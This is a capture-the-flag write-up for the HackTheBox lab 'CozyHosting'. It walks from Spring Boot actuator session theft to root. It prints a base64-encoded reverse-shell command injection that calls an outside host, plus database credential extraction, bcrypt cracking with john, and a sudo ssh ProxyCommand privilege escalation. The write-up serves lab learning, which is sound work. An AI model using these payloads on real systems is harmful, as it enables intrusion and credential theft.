# CozyHosting

###### Easy - x1foideo


## Initial Recon 

#### Nmap

As usual first thing to do is a _nmap_ recognition

```bash
nmap -sS -sV -p- <IP> -o cozyhosting
```
```
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.18.0 (Ubuntu)
8000/tcp open  http-alt?
8001/tcp open  vcom-tunnel?
8083/tcp open  us-srv?
8084/tcp open  websnp?
8087/tcp open  simplifymedia?
8088/tcp open  radan-http?
8089/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


#### Hosts

One of the first thing I learned to do if not able to reach the webpage is to edit the _hosts_ file.

```bash
sudo nano /etc/hosts
```
```
<HOST> <ADDRESS>
```


#### WebEnumeration

Reaching the service, we land on a simple page where everything we are able to do is to Login.

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/cozyhosting/index_page.png?raw=true" width="600">

The problem is that we do not know any username and password and for this reason we can't login.
Trying with default credentials is useless.

Good idea is to try some enumeration.

```bash
gobuster dir -e -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
```
http://cozyhosting.htb/]                    (Status: 400) [Size: 435]
http://cozyhosting.htb/[                    (Status: 400) [Size: 435]
http://cozyhosting.htb/admin                (Status: 401) [Size: 97] 
http://cozyhosting.htb/asdfjkl;             (Status: 200) [Size: 0]  
http://cozyhosting.htb/error                (Status: 500) [Size: 73] 
http://cozyhosting.htb/index                (Status: 200) [Size: 12706]
http://cozyhosting.htb/login                (Status: 200) [Size: 4431] 
http://cozyhosting.htb/logout               (Status: 204) [Size: 0]    
http://cozyhosting.htb/plain]               (Status: 400) [Size: 435]  
http://cozyhosting.htb/quote]               (Status: 400) [Size: 435]  
```

At first sight we get nothing interesting, except for the _admin_ page, however trying to access it we are redirected to the login page, finding ourselves back to the beginning.

Interesting is playing with other links, where all point to a strange error page

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/cozyhosting/error_page.png?raw=true" width="600">

Searching the internet for _Whitelabel Error Page_, we find out that it's a _Spring Boot error page_.

We can proceed at this point to a new enumeration for interesting pages related to this framework:

```bash
gobuster dir -e -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
```
```
http://cozyhosting.htb/actuator/mappings    (Status: 200) [Size: 9938]
http://cozyhosting.htb/actuator/sessions    (Status: 200) [Size: 198] 
http://cozyhosting.htb/actuator             (Status: 200) [Size: 634] 
http://cozyhosting.htb/actuator/health      (Status: 200) [Size: 15]  
http://cozyhosting.htb/actuator/env         (Status: 200) [Size: 4957]
http://cozyhosting.htb/actuator/beans       (Status: 200) [Size: 127224]
```

Looking for informations about these, we get that _actuator/sessions_ represents all the active sessions.
We found that most of the sessions are "UNAUTHORIZED", however, it's possible to find something related to a "kanderson".

We can abuse the data we got using **Burp**.
Trying to access to _admin_ page we can intercept a GET request with an interesting Cookie Header:

``` html
Cookie: JSESSIONID=E2630FCF6238722EC6F74A7929A36F5E
```

Editing this one with the one related to "kanderson", we are able to access to the _Admin Dashboard_

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/cozyhosting/dashboard_page.png?raw=true" width="600">


## Solution

#### Command Injection

Analyzing the Dashboard it is possible to find out the only interesting thing here deals with the form which relates to an _ssh\_connection_.

Sending some datas and inspecting the traffic with Burp, results that it is possible to take advantage of this form with a Command Injection.
Moreover, we are not allowed to use spaces in username form, and since I was having problem sending the payload in plaintext, I decided to use base64.

Trying for a revshell resulted in:
- Hostname: _localhost_
- Username:
```
kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;
```

If you want, stabilize the shell. 
And we are in, but without any possibility to do anything...

Analyzing what's inside the folder we get a single file named _cloudhosting-0.0.1.jar_.
Since this file has been left here for a reason, and since we cannot open it, we can download it to our local machine spawning a _python http server_ on the remote machine

```bash
python3 -m http.server 9999
```

and download it locally

```bash
curl <IP>:9999/cloudhosting-0.0.1.jar > cloudhosting.jar
```

Opening the _.jar_ file and inspecting its content, it's possible to retrieve in _BOOT-INF/classes_ a file named _application.properties_ which contains info about a POSTGRES DB.

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```


#### User Flag

On the remote host we are able to access the DB.

```
psql -h localhost -d cozyhosting -U postgres
```

When prompted for password : _Vg&nvzAQ7XxR_

Now we need to know what are the tables in the _db_:

```
\dt
```
```
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

After getting this info we can get all the records in the 'users' table:

```sql
SELECT * FROM users;
```
```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

As usual passwords are _bcrypt-hashed_ and for retrieving it we could use _john_.
We can create a new _.txt_ file with the hashed passwords and then run the command

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt to_crack.txt
```

Retrieving as password: _manchesterunited_

Another info we get is that there is a user named _josh_ in the home folder, and we know that SSH port is open.

Now we can SSH as user _josh_ and password _manchesterunited_, founding the _User Flag_


#### Root Flag

Common thing to do is to check if we can run some commands as sudo:

```bash
sudo -l

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

Looking for info on **GTFOBins** for elevating our privileges with ssh command, we get that we can run:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Get the flag in /root folder


#nmap #enumeration #gobuster #sudo #postgre #gtfobins #ssh #revshell #reverseshell #burp #commandinjection #cookie #springboot #john